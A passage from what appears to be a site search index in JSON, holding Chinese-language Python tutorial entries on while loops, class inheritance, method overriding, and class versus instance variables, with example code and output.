print(var) \u8fd0\u884c\u7ed3\u679c\uff1a 1 1 1 1 \u3002\u3002\u3002 \uff08\u76f4\u5230\u6309\u4e0bctrl+1\u624d\u7ed3\u675f\uff09 while \u5faa\u73af\u4f7f\u7528 else \u8bed\u53e5 \u5982\u679c while \u540e\u9762\u7684\u6761\u4ef6\u8bed\u53e5\u4e3a false \u65f6\uff0c\u5219\u6267\u884c else \u7684\u8bed\u53e5\u5757\u3002 \u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a while <expr>: <statement(s)> else: <additional_statement(s)> expr \u6761\u4ef6\u8bed\u53e5\u4e3a true \u5219\u6267\u884c statement(s) \u8bed\u53e5\u5757\uff0c\u5982\u679c\u4e3a false\uff0c\u5219\u6267\u884c additional_statement(s)\u3002 \u5faa\u73af\u8f93\u51fa\u6570\u5b57\uff0c\u5e76\u5224\u65ad\u5927\u5c0f\uff1a count = 0 while count < 5: print (count, \" \u5c0f\u4e8e 5\") count = count + 1 else: print (count, \" \u5927\u4e8e\u6216\u7b49\u4e8e 5\") \u8fd0\u884c\u7ed3\u679c\uff1a 0 \u5c0f\u4e8e 5 1 \u5c0f\u4e8e 5 2 \u5c0f\u4e8e 5 3 \u5c0f\u4e8e 5 4 \u5c0f\u4e8e 5 5 \u5927\u4e8e\u6216\u7b49\u4e8e 5 while \u5faa\u73af\u4f7f\u7528 break \u8bed\u53e5 n = 5 while n > 0: n -= 1 if n == 2: break print(n) print('\u5faa\u73af\u7ed3\u675f\u3002') \u8fd0\u884c\u7ed3\u679c\uff1a 4 3 \u5faa\u73af\u7ed3\u675f\u3002 while \u5faa\u73af\u4f7f\u7528 continue \u8bed\u53e5 n = 5 while n > 0: n -= 1 if n == 2: continue print(n) print('\u5faa\u73af\u7ed3\u675f\u3002') \u8fd0\u884c\u7ed3\u679c\uff1a 4 3 1 0 \u5faa\u73af\u7ed3\u675f\u3002 \u00df 8. \u590d\u5408\u8bed\u53e5 \u2014 Python 3.10.7 \u6587\u6863","title":"while\u8bed\u53e5"},{"location":"programming_language/python/basics/while/#_1","text":"\u5faa\u73af\u8bed\u53e5\uff0c\u800c[\u5faa\u73af\u8bed\u53e5]\u7531[\u5faa\u73af\u4f53]\u53ca\u5faa\u73af\u7684\u5224\u5b9a[\u6761\u4ef6]\u4e24\u90e8\u5206\u7ec4\u6210 while_stmt ::= \"while\" assignment_expression \":\" suite [\"else\" \":\" suite]","title":"\u5faa\u73af"},{"location":"programming_language/python/basics/while/#while","text":"Python \u4e2d while \u8bed\u53e5\u7684\u4e00\u822c\u5f62\u5f0f\uff1a while \u5224\u65ad\u6761\u4ef6(condition)\uff1a \u6267\u884c\u8bed\u53e5(statements)\u2026\u2026 \u4f8b\uff1a counter = 0 while counter <= 10: counter += 1 print(counter) \u8fd0\u884c\u7ed3\u679c\uff1a 1 2 3 4 5 6 7 8 9 10 11","title":"while \u5faa\u73af"},{"location":"programming_language/python/basics/while/#wile","text":"from time import sleep var = 1 while var == 1: # \u8868\u8fbe\u5f0f\u6c38\u8fdc\u4e3a true sleep(1) # \u7761\u4e00\u79d2 print(var) \u8fd0\u884c\u7ed3\u679c\uff1a 1 1 1 1 \u3002\u3002\u3002 \uff08\u76f4\u5230\u6309\u4e0bctrl+1\u624d\u7ed3\u675f\uff09","title":"wile\u6b7b\u5faa\u73af"},{"location":"programming_language/python/basics/while/#while-else","text":"\u5982\u679c while \u540e\u9762\u7684\u6761\u4ef6\u8bed\u53e5\u4e3a false \u65f6\uff0c\u5219\u6267\u884c else \u7684\u8bed\u53e5\u5757\u3002 \u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a while <expr>: <statement(s)> else: <additional_statement(s)> expr \u6761\u4ef6\u8bed\u53e5\u4e3a true \u5219\u6267\u884c statement(s) \u8bed\u53e5\u5757\uff0c\u5982\u679c\u4e3a false\uff0c\u5219\u6267\u884c additional_statement(s)\u3002 \u5faa\u73af\u8f93\u51fa\u6570\u5b57\uff0c\u5e76\u5224\u65ad\u5927\u5c0f\uff1a count = 0 while count < 5: print (count, \" \u5c0f\u4e8e 5\") count = count + 1 else: print (count, \" \u5927\u4e8e\u6216\u7b49\u4e8e 5\") \u8fd0\u884c\u7ed3\u679c\uff1a 0 \u5c0f\u4e8e 5 1 \u5c0f\u4e8e 5 2 \u5c0f\u4e8e 5 3 \u5c0f\u4e8e 5 4 \u5c0f\u4e8e 5 5 \u5927\u4e8e\u6216\u7b49\u4e8e 5","title":"while \u5faa\u73af\u4f7f\u7528 else \u8bed\u53e5"},{"location":"programming_language/python/basics/while/#while-break","text":"n = 5 while n > 0: n -= 1 if n == 2: break print(n) print('\u5faa\u73af\u7ed3\u675f\u3002') \u8fd0\u884c\u7ed3\u679c\uff1a 4 3 \u5faa\u73af\u7ed3\u675f\u3002","title":"while \u5faa\u73af\u4f7f\u7528 break \u8bed\u53e5"},{"location":"programming_language/python/basics/while/#while-continue","text":"n = 5 while n > 0: n -= 1 if n == 2: continue print(n) print('\u5faa\u73af\u7ed3\u675f\u3002') \u8fd0\u884c\u7ed3\u679c\uff1a 4 3 1 0 \u5faa\u73af\u7ed3\u675f\u3002 \u00df 8. \u590d\u5408\u8bed\u53e5 \u2014 Python 3.10.7 \u6587\u6863","title":"while \u5faa\u73af\u4f7f\u7528 continue \u8bed\u53e5"},{"location":"programming_language/python/basics/class/class/","text":"\u7c7b\u7684\u7ee7\u627f class Person(object): # \u5b9a\u4e49\u4e00\u4e2a\u7236\u7c7b def talk(self): # \u7236\u7c7b\u4e2d\u7684\u65b9\u6cd5 print(\"person is talking....\") class Chinese(Person): # \u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b\uff0c \u7ee7\u627fPerson\u7c7b def walk(self): # \u5728\u5b50\u7c7b\u4e2d\u5b9a\u4e49\u5176\u81ea\u8eab\u7684\u65b9\u6cd5 print('is walking...') c = Chinese() c.talk() # \u8c03\u7528\u7ee7\u627f\u7684Person\u7c7b\u7684\u65b9\u6cd5 c.walk() # \u8c03\u7528\u672c\u8eab\u7684\u65b9\u6cd5 # \u8f93\u51fa person is talking.... is walking... \u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f \u7ecf\u5178\u7c7b\u7684\u5199\u6cd5\uff1a \u7236\u7c7b\u540d\u79f0.__init__(self,\u53c2\u65701\uff0c\u53c2\u65702\uff0c...) \u65b0\u5f0f\u7c7b\u7684\u5199\u6cd5\uff1a super(\u5b50\u7c7b\uff0cself).__init__(\u53c2\u65701\uff0c\u53c2\u65702\uff0c....) class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(\"person is talking....\") class Chinese(Person): def __init__(self, name, age, language): # \u5148\u7ee7\u627f\uff0c\u5728\u91cd\u6784 Person.__init__(self, name, age) #\u7ee7\u627f\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210\uff1asuper(Chinese,self).__init__(name,age) self.language = language # \u5b9a\u4e49\u7c7b\u7684\u672c\u8eab\u5c5e\u6027 def walk(self): print('is walking...') class American(Person): pass c = Chinese('bigberg', 22, 'Chinese') \u5b50\u7c7b\u5bf9\u7236\u7c7b\u65b9\u6cd5\u7684\u91cd\u5199 class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(\"person is talking....\") class Chinese(Person): def __init__(self, name, age, language): Person.__init__(self, name, age) self.language = language print(self.name, self.age, self.weight, self.language) def talk(self): # \u5b50\u7c7b \u91cd\u6784\u65b9\u6cd5 print('%s is speaking chinese' % self.name) def walk(self): print('is walking...') c = Chinese('bigberg', 22, 'Chinese') c.talk() # \u8f93\u51fa bigberg 22 weight Chinese bigberg is speaking chinese \u7c7b\u7ee7\u627f\u7684\u4e8b\u4f8b class SchoolMember(object): '''\u5b66\u4e60\u6210\u5458\u57fa\u7c7b''' member = 0 def __init__(self, name, age, sex): self.name = name self.age = age self.sex = sex self.enroll() def enroll(self): '\u6ce8\u518c' print('just enrolled a new school member [%s].' % self.name) SchoolMember.member += 1 def tell(self): print('----%s----' % self.name) for k, v in self.__dict__.items(): print(k, v) print('----end-----') def __del__(self): print('\u5f00\u9664\u4e86[%s]' % self.name) SchoolMember.member -= 1 class Teacher(SchoolMember): '\u6559\u5e08' def __init__(self, name, age, sex, salary, course): SchoolMember.__init__(self, name, age, sex) self.salary = salary self.course = course def teaching(self): print('Teacher [%s] is teaching [%s]' % (self.name, self.course)) class Student(SchoolMember): '\u5b66\u751f' def __init__(self, name, age, sex, course, tuition): SchoolMember.__init__(self, name, age, sex) self.course = course self.tuition = tuition self.amount = 0 def pay_tuition(self, amount): print('student [%s] has just paied [%s]' % (self.name, amount)) self.amount += amount t1 = Teacher('Wusir', 28, 'M', 3000, 'python') t1.tell() s1 = Student('haitao', 38, 'M', 'python', 30000) s1.tell() s2 = Student('lichuang', 12, 'M', 'python', 11000) print(SchoolMember.member) del s2 print(SchoolMember.member) # \u8f93\u51fa ----end----- just enrolled a new school member [haitao]. ----haitao---- age 38 sex M name haitao amount 0 course python tuition 30000 ----end----- just enrolled a new school member [lichuang]. 3 \u5f00\u9664\u4e86[lichuang] 2 \u5f00\u9664\u4e86[Wusir] \u5f00\u9664\u4e86[haitao]","title":"\u7c7b\u7684\u7ee7\u627f"},{"location":"programming_language/python/basics/class/class/#_1","text":"class Person(object): # \u5b9a\u4e49\u4e00\u4e2a\u7236\u7c7b def talk(self): # \u7236\u7c7b\u4e2d\u7684\u65b9\u6cd5 print(\"person is talking....\") class Chinese(Person): # \u5b9a\u4e49\u4e00\u4e2a\u5b50\u7c7b\uff0c \u7ee7\u627fPerson\u7c7b def walk(self): # \u5728\u5b50\u7c7b\u4e2d\u5b9a\u4e49\u5176\u81ea\u8eab\u7684\u65b9\u6cd5 print('is walking...') c = Chinese() c.talk() # \u8c03\u7528\u7ee7\u627f\u7684Person\u7c7b\u7684\u65b9\u6cd5 c.walk() # \u8c03\u7528\u672c\u8eab\u7684\u65b9\u6cd5 # \u8f93\u51fa person is talking.... is walking...","title":"\u7c7b\u7684\u7ee7\u627f"},{"location":"programming_language/python/basics/class/class/#_2","text":"\u7ecf\u5178\u7c7b\u7684\u5199\u6cd5\uff1a \u7236\u7c7b\u540d\u79f0.__init__(self,\u53c2\u65701\uff0c\u53c2\u65702\uff0c...) \u65b0\u5f0f\u7c7b\u7684\u5199\u6cd5\uff1a super(\u5b50\u7c7b\uff0cself).__init__(\u53c2\u65701\uff0c\u53c2\u65702\uff0c....) class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(\"person is talking....\") class Chinese(Person): def __init__(self, name, age, language): # \u5148\u7ee7\u627f\uff0c\u5728\u91cd\u6784 Person.__init__(self, name, age) #\u7ee7\u627f\u7236\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210\uff1asuper(Chinese,self).__init__(name,age) self.language = language # \u5b9a\u4e49\u7c7b\u7684\u672c\u8eab\u5c5e\u6027 def walk(self): print('is walking...') class American(Person): pass c = Chinese('bigberg', 22, 'Chinese')","title":"\u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f"},{"location":"programming_language/python/basics/class/class/#_3","text":"class Person(object): def __init__(self, name, age): self.name = name self.age = age self.weight = 'weight' def talk(self): print(\"person is talking....\") class Chinese(Person): def __init__(self, name, age, language): Person.__init__(self, name, age) self.language = language print(self.name, self.age, self.weight, self.language) def talk(self): # \u5b50\u7c7b \u91cd\u6784\u65b9\u6cd5 print('%s is speaking chinese' % self.name) def walk(self): print('is walking...') c = Chinese('bigberg', 22, 'Chinese') c.talk() # \u8f93\u51fa bigberg 22 weight Chinese bigberg is speaking chinese","title":"\u5b50\u7c7b\u5bf9\u7236\u7c7b\u65b9\u6cd5\u7684\u91cd\u5199"},{"location":"programming_language/python/basics/class/class/#_4","text":"class SchoolMember(object): '''\u5b66\u4e60\u6210\u5458\u57fa\u7c7b''' member = 0 def __init__(self, name, age, sex): self.name = name self.age = age self.sex = sex self.enroll() def enroll(self): '\u6ce8\u518c' print('just enrolled a new school member [%s].' % self.name) SchoolMember.member += 1 def tell(self): print('----%s----' % self.name) for k, v in self.__dict__.items(): print(k, v) print('----end-----') def __del__(self): print('\u5f00\u9664\u4e86[%s]' % self.name) SchoolMember.member -= 1 class Teacher(SchoolMember): '\u6559\u5e08' def __init__(self, name, age, sex, salary, course): SchoolMember.__init__(self, name, age, sex) self.salary = salary self.course = course def teaching(self): print('Teacher [%s] is teaching [%s]' % (self.name, self.course)) class Student(SchoolMember): '\u5b66\u751f' def __init__(self, name, age, sex, course, tuition): SchoolMember.__init__(self, name, age, sex) self.course = course self.tuition = tuition self.amount = 0 def pay_tuition(self, amount): print('student [%s] has just paied [%s]' % (self.name, amount)) self.amount += amount t1 = Teacher('Wusir', 28, 'M', 3000, 'python') t1.tell() s1 = Student('haitao', 38, 'M', 'python', 30000) s1.tell() s2 = Student('lichuang', 12, 'M', 'python', 11000) print(SchoolMember.member) del s2 print(SchoolMember.member) # \u8f93\u51fa ----end----- just enrolled a new school member [haitao]. ----haitao---- age 38 sex M name haitao amount 0 course python tuition 30000 ----end----- just enrolled a new school member [lichuang]. 3 \u5f00\u9664\u4e86[lichuang] 2 \u5f00\u9664\u4e86[Wusir] \u5f00\u9664\u4e86[haitao]","title":"\u7c7b\u7ee7\u627f\u7684\u4e8b\u4f8b"},{"location":"programming_language/python/basics/class/class_var/","text":"Python \u7c7b\u53d8\u91cf\u4e0e\u5b9e\u4f8b\u53d8\u91cf \u7c7b\u53d8\u91cf\uff1a \u7c7b\u53d8\u91cf\u5b9a\u4e49\u5728\u7c7b\u4e2d\u4e14\u5728\u51fd\u6570\u4f53\u4e4b\u5916\u3002\u7c7b\u53d8\u91cf\u901a\u5e38\u4e0d\u4f5c\u4e3a\u5b9e\u4f8b\u53d8\u91cf\u4f7f\u7528\u3002\u7c7b\u53d8\u91cf\u5728\u6574\u4e2a\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61\u4e2d\u662f\u516c\u7528\u7684\u3002 \u5b9e\u4f8b\u53d8\u91cf\uff1a \u5b9a\u4e49\u5728\u65b9\u6cd5\u4e2d\u7684\u53d8\u91cf\uff0c\u7528 self \u7ed1\u5b9a\u5230\u5b9e\u4f8b\u4e0a\uff0c\u53ea\u4f5c\u7528\u4e8e\u5f53\u524d\u5b9e\u4f8b\u7684\u7c7b\u3002 \u8bbf\u95ee\u65b9\u5f0f \u7c7b\u53d8\u91cf\uff1a \u5728\u7c7b\u5185\u90e8\u548c\u5916\u90e8\uff0c\u7c7b\u53d8\u91cf\u90fd\u7528 \u7c7b\u540d.\u7c7b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5728\u7c7b\u5185\u90e8\uff0c\u4e5f\u53ef\u4ee5\u7528 self.\u7c7b\u53d8\u91cf \u6765\u8bbf\u95ee\u7c7b\u53d8\u91cf\uff0c\u4f46\u6b64\u65f6\u5b83\u7684\u542b\u4e49\u5df2\u7ecf\u53d8\u4e86\uff0c\u5b9e\u9645\u4e0a\u5b83\u5df2\u7ecf\u6210\u4e86\u4e00\u4e2a\u5b9e\u4f8b\u53d8\u91cf\u3002\u5728\u5b9e\u4f8b\u53d8\u91cf\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\u65f6\uff0c\u7528 self.\u7c7b\u53d8\u91cf \u624d\u80fd\u8bbf\u95ee\u5230\u6b63\u786e\u7684\u503c\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u5b9e\u4f8b\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u7684\u503c\uff0c\u5c31\u50cf\u5c40\u90e8\u53d8\u91cf\u5c4f\u853d\u6389\u5168\u5c40\u53d8\u91cf\u7684\u503c\u4e00\u6837\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0b\u662f\u4e0d\u5c06\u7c7b\u53d8\u91cf\u4f5c\u4e3a\u5b9e\u4f8b\u53d8\u91cf\u4f7f\u7528\u7684\u3002 \u5b9e\u4f8b\u53d8\u91cf\uff1a \u5728\u7c7b\u5185\u90e8\uff0c\u5b9e\u4f8b\u53d8\u91cf\u7528 self.\u5b9e\u4f8b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\uff1b\u5728\u7c7b\u5916\u90e8\uff0c\u7528 \u5b9e\u4f8b\u540d.\u5b9e\u4f8b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5b9e\u4f8b\u53d8\u91cf\u662f\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5b9e\u4f8b\u4e0a\u7684\u53d8\u91cf\uff0c\u5b83\u53ea\u5c5e\u4e8e\u8fd9\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u4e00\u70b9\u533a\u522b\u4e8e\u7c7b\u53d8\u91cf\uff0c\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u6765\u81ea\u4e8e\u540c\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b\u6240\u5171\u4eab\u7684\u3002 self \u7b80\u4ecb \u7c7b\u7684\u65b9\u6cd5\u4e0e\u666e\u901a\u7684\u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684\u533a\u522b \u2014\u2014 \u5b83\u4eec\u5fc5\u987b\u6709\u4e00\u4e2a\u989d\u5916\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u540d\u79f0\uff0c\u4f46\u662f\u5728\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u65f6\u5019\u4f60\u4e0d\u4e3a\u8fd9\u4e2a\u53c2\u6570\u8d4b\u503c\uff0cPython \u4f1a\u63d0\u4f9b\u8fd9\u4e2a\u503c\u3002\u8fd9\u4e2a\u7279\u522b\u7684\u53d8\u91cf\u6307\u5bf9\u8c61\u672c\u8eab\uff0c\u6309\u7167\u60ef\u4f8b\u5b83\u7684\u540d\u79f0\u662f self\u3002\u867d\u7136\u4f60\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u53c2\u6570\u4efb\u4f55\u540d\u79f0\uff0c\u4f46\u662f \u5f3a\u70c8\u5efa\u8bae \u4f60\u4f7f\u7528 self \u8fd9\u4e2a\u540d\u79f0\u3002 \u5b9e\u9645\u4e0a\uff0c\u5b9e\u4f8b\u53d8\u91cf\u5c31\u662f\u4e00\u4e2a\u7528 self \u4fee\u9970\u7684\u53d8\u91cf\u3002self \u5c06\u4e00\u4e2a\u53d8\u91cf\u7ed1\u5b9a\u5230\u4e00\u4e2a\u7279\u5b9a\u7684\u5b9e\u4f8b\u4e0a\uff0c\u8fd9\u6837\u5b83\u5c31\u5c5e\u4e8e\u8fd9\u5b9e\u4f8b\u81ea\u5df1\u3002 class A(object): va = \"10\" def foo(self): print(\"A.va=\" + A.va) print(\"self.va=\" + self.va) self.va = \"40\" print(\"A.va=\" + A.va) print(\"self.va=\" + self.va) va = \"20\" print(\"va=\"+va) A.va = \"15\" print(\"A.va=\"+A.va) print(\"self.v=\"+self.va) obj1 = A() obj2 = A() obj1.foo() print(A.va) print(obj1.va) print(obj2.va) \u7ed3\u679c\uff1a A.va=10 self.va=10 A.va=10 self.va=40 va=20 A.va=15 self.v=40 15 40 15 \u5206\u6790\u7a0b\u5e8f\u7ed3\u679c\u6211\u4eec\u53d1\u73b0\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7c7b\u53d8\u91cf\u53ef\u4ee5\u7528\u7c7b\u540d\u6216\u8005self\u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5f53 self.\u7c7b\u53d8\u91cf \u88ab\u91cd\u65b0\u8d4b\u503c\u65f6\uff0c\u5b83\u7684\u503c\u5c31\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4f46\u7c7b\u53d8\u91cf\u7684\u503c\u4e0d\u4f1a\u968f\u4e4b\u53d8\u5316\u3002\u65b9\u6cd5\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\u3002\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u5b9e\u4f8b\u5171\u4eab\u7684\uff0c\u800c\u5b9e\u4f8b\u53d8\u91cf\u53ea\u5c5e\u4e8e\u5bf9\u8c61\u81ea\u5df1\uff0c\u6bcf\u4e2a\u5b9e\u4f8b\u7684\u5b9e\u4f8b\u53d8\u91cf\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u503c\u3002 \u8981\u70b9\u603b\u7ed3 1\u3001\u7c7b\u53d8\u91cf\u53ef\u4ee5\u7528 \u7c7b\u540d.\u7c7b\u53d8\u91cf \u548c self.\u7c7b\u53d8\u91cf \u4e24\u79cd\u65b9\u5f0f\u8bbf\u95ee\uff0c\u540e\u8005\u4e00\u822c\u60c5\u51b5\u4e0d\u5efa\u8bae\u4f7f\u7528\u3002 2\u3001\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u5bf9\u8c61\u6240\u5171\u4eab\u7684\uff0c\u65e0\u8bba\u4efb\u4f55\u65f6\u5019\u90fd\u5efa\u8bae\u7528\u7c7b\u540d\u7684\u65b9\u5f0f\u8bbf\u95ee\u7c7b\u53d8\u91cf\u3002 3\u3001\u5b9e\u4f8b\u53d8\u91cf\u5728\u7c7b\u5185\u90e8\u7528 self \u8bbf\u95ee\uff0c\u5728\u7c7b\u5916\u90e8\u7528\u5b9e\u4f8b\u540d\u8bbf\u95ee\u3002 4\u3001\u7c7b\u53d8\u91cf\u901a\u8fc7 self \u8bbf\u95ee\u65f6\u5219\u88ab\u8f6c\u5316\u4e3a\u5b9e\u4f8b\u53d8\u91cf\uff0c\u88ab\u7ed1\u5b9a\u5230\u7279\u5b9a\u7684\u5b9e\u4f8b\u4e0a\uff0c\u5176\u503c\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u3002 5\u3001\u901a\u8fc7\u5bf9\u5b9e\u4f8b\u53d8\u91cf\uff08self\uff09\u7684\u5f62\u5f0f\u5bf9\u7c7b\u53d8\u91cf\u91cd\u65b0\u8d4b\u503c\u540e\uff0c\u7c7b\u53d8\u91cf\u7684\u503c\u4e0d\u968f\u4e4b\u53d8\u5316\u3002 6\u3001\u65b9\u6cd5\u5185\u7684\u5c40\u90e8\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u548c\u5b9e\u4f8b\u53d8\u91cf\u3002 7\u3001\u540c\u4e00\u5b9e\u4f8b\u53d8\u91cf\u5728\u4e0d\u540c\u7684\u5b9e\u4f8b\u4e2d\u53ef\u80fd\u62e5\u6709\u4e0d\u540c\u7684\u503c\u3002 http://kuanghy.github.io/2015/12/19/python-variable \u5b98\u65b9\u5bf9\u4e8eself\u7684\u8bb2\u89e3 \u7f16\u7a0b\u5e38\u89c1\u95ee\u9898 \u2014 Python 3.9.12 \u6587\u6863","title":"\u7c7b\u53d8\u91cf\u4e0e\u5b9e\u4f8b\u53d8\u91cf"},{"location":"programming_language/python/basics/class/class_var/#python","text":"\u7c7b\u53d8\u91cf\uff1a \u7c7b\u53d8\u91cf\u5b9a\u4e49\u5728\u7c7b\u4e2d\u4e14\u5728\u51fd\u6570\u4f53\u4e4b\u5916\u3002\u7c7b\u53d8\u91cf\u901a\u5e38\u4e0d\u4f5c\u4e3a\u5b9e\u4f8b\u53d8\u91cf\u4f7f\u7528\u3002\u7c7b\u53d8\u91cf\u5728\u6574\u4e2a\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61\u4e2d\u662f\u516c\u7528\u7684\u3002 \u5b9e\u4f8b\u53d8\u91cf\uff1a \u5b9a\u4e49\u5728\u65b9\u6cd5\u4e2d\u7684\u53d8\u91cf\uff0c\u7528 self \u7ed1\u5b9a\u5230\u5b9e\u4f8b\u4e0a\uff0c\u53ea\u4f5c\u7528\u4e8e\u5f53\u524d\u5b9e\u4f8b\u7684\u7c7b\u3002","title":"Python \u7c7b\u53d8\u91cf\u4e0e\u5b9e\u4f8b\u53d8\u91cf"},{"location":"programming_language/python/basics/class/class_var/#_1","text":"\u7c7b\u53d8\u91cf\uff1a \u5728\u7c7b\u5185\u90e8\u548c\u5916\u90e8\uff0c\u7c7b\u53d8\u91cf\u90fd\u7528 \u7c7b\u540d.\u7c7b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5728\u7c7b\u5185\u90e8\uff0c\u4e5f\u53ef\u4ee5\u7528 self.\u7c7b\u53d8\u91cf \u6765\u8bbf\u95ee\u7c7b\u53d8\u91cf\uff0c\u4f46\u6b64\u65f6\u5b83\u7684\u542b\u4e49\u5df2\u7ecf\u53d8\u4e86\uff0c\u5b9e\u9645\u4e0a\u5b83\u5df2\u7ecf\u6210\u4e86\u4e00\u4e2a\u5b9e\u4f8b\u53d8\u91cf\u3002\u5728\u5b9e\u4f8b\u53d8\u91cf\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\u65f6\uff0c\u7528 self.\u7c7b\u53d8\u91cf \u624d\u80fd\u8bbf\u95ee\u5230\u6b63\u786e\u7684\u503c\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u5b9e\u4f8b\u53d8\u91cf\u4f1a\u5c4f\u853d\u6389\u7c7b\u53d8\u91cf\u7684\u503c\uff0c\u5c31\u50cf\u5c40\u90e8\u53d8\u91cf\u5c4f\u853d\u6389\u5168\u5c40\u53d8\u91cf\u7684\u503c\u4e00\u6837\u3002\u6240\u4ee5\u4e00\u822c\u60c5\u51b5\u4e0b\u662f\u4e0d\u5c06\u7c7b\u53d8\u91cf\u4f5c\u4e3a\u5b9e\u4f8b\u53d8\u91cf\u4f7f\u7528\u7684\u3002 \u5b9e\u4f8b\u53d8\u91cf\uff1a \u5728\u7c7b\u5185\u90e8\uff0c\u5b9e\u4f8b\u53d8\u91cf\u7528 self.\u5b9e\u4f8b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\uff1b\u5728\u7c7b\u5916\u90e8\uff0c\u7528 \u5b9e\u4f8b\u540d.\u5b9e\u4f8b\u53d8\u91cf \u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5b9e\u4f8b\u53d8\u91cf\u662f\u7ed1\u5b9a\u5230\u4e00\u4e2a\u5b9e\u4f8b\u4e0a\u7684\u53d8\u91cf\uff0c\u5b83\u53ea\u5c5e\u4e8e\u8fd9\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u4e00\u70b9\u533a\u522b\u4e8e\u7c7b\u53d8\u91cf\uff0c\u7c7b\u53d8\u91cf\u662f\u6240\u6709\u6765\u81ea\u4e8e\u540c\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b\u6240\u5171\u4eab\u7684\u3002","title":"\u8bbf\u95ee\u65b9\u5f0f"},{"location":"programming_language/python/basics/class/class_var/#self","text":"\u7c7b\u7684\u65b9\u6cd5\u4e0e\u666e\u901a\u7684\u51fd\u6570\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684\u533a\u522b \u2014\u2014 \u5b83\u4eec\u5fc5\u987b\u6709\u4e00\u4e2a\u989d\u5916\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u540d\u79f0\uff0c\u4f46\u662f\u5728\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u7684\u65f6\u5019\u4f60\u4e0d\u4e3a\u8fd9\u4e2a\u53c2\u6570\u8d4b\u503c\uff0cPython \u4f1a\u63d0\u4f9b\u8fd9\u4e2a\u503c\u3002\u8fd9\u4e2a\u7279\u522b\u7684\u53d8\u91cf\u6307\u5bf9\u8c61\u672c\u8eab\uff0c\u6309\u7167\u60ef\u4f8b\u5b83\u7684\u540d\u79f0\u662f self\u3002\u867d\u7136\u4f60\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u53c2\u6570\u4efb\u4f55\u540d\u79f0\uff0c\u4f46\u662f \u5f3a\u70c8\u5efa\u8bae \u4f60\u4f7f\u7528 self \u8fd9\u4e2a\u540d\u79f0\u3002 \u5b9e\u9645\u4e0a\uff0c\u5b9e\u4f8b\u53d8\u91cf\u5c31\u662f\u4e00\u4e2a\u7528 self \u4fee\u9970\u7684\u53d8\u91cf\u3002self \u5c06\u4e00\u4e2a\u53d8\u91cf\u7ed1\u5b9a\u5230\u4e00\u4e2a\u7279\u5b9a\u7684\u5b9e\u4f8b\u4e0a\uff0c\u8fd9\u6837\u5b83\u5c31\u5c5e\u4e8e\u8fd9\u5b9e\u4f8b\u81ea\u5df1\u3002 class A(object): va = \"10\" def foo(self): print(\"A.va=\" + A.va) print(\"self.va=\" + self.va) self.va = \"40\" print(\"A.va=\" + A.va) print(\"self.va=\" + self.va) va = \"20\" print(\"va=\"+va) A.va = \"15\" print(\"A.va=\"+A.va) print(\"self.v=\"+self.va) obj1 = A() obj2 = A() obj1.foo() print(A.va) print(obj1.va) print(obj2.va) \u7ed3\u679c\uff1a A.va=10 self.va=10 A.va=10 self.va=40 va=20 A.va=15 self.v=40 15 40 15 \u5206\u6790\u7a0b\u5e8f\u7ed3\u679c\u6211\u4eec\u53d1\u73b0\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7c7b\u53d8\u91cf\u53ef\u4ee5\u7528\u7c7b\u540d\u6216\u8005self\u7684\u5f62\u5f0f\u8bbf\u95ee\u3002\u5f53 self.\u7c7b\u53d8\u91cf 